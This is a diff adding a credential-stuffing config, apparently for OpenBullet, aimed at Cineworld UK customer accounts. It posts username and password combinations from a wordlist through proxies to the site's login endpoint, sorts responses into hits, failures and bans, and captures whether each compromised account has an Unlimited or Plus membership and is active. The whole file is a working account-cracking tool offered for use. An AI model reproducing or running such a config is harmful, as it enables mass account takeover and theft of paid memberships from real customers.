@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "Cineworld",
+  "SuggestedBots": 100,
+  "LastModified": "2019-06-22T22:22:00.147413+01:00",
+  "AdditionalInfo": "",
+  "Author": "Shycrackzz",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Cineworld_Login_Page REQUEST POST "https://www.cineworld.co.uk/presLogin" 
+  CONTENT "?&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#Cineworld_Hit\Fail_Keys_ KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"code\":\"UNLIMITED\"" 
+    KEY "<SOURCE>" EqualTo "" 
+  KEYCHAIN Failure OR 
+    KEY "\"NOT_FOUND\"" 
+    KEY "\"resultCode\":-1" 
+    KEY "\"resultCode\": -1" 
+    KEY "\"error\":\"NOT_FOUND\"" 
+  KEYCHAIN Ban OR 
+    KEY "<SOURCE>" EqualTo "The requested URL was rejected." 
+    KEY "<SOURCE>" EqualTo "<title>Request Rejected</title>" 
+    KEY "<br>Your support ID is:" 
+    KEY "<body>The requested URL was rejected. Please consult with your administrator.<br>" 
+#Unlimited_Checker PARSE "<SOURCE>" LR "[{\"code\":\"" "\"}," -> CAP "Has Unlimited" 
+#Plus_Checker PARSE "<SOURCE>" LR "LD\"},{\"code\":\"" "\"}]" -> CAP "Has Plus" 
+#Cineworld_Account_Page REQUEST GET "https://www.cineworld.co.uk/mycineworld/account" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#Active_Checker PARSE "<SOURCE>" LR "<p style=\"margin: 15px 0\">Status: <span class=\"text-bold text-success\">" "</span></p>" -> CAP "Active" 
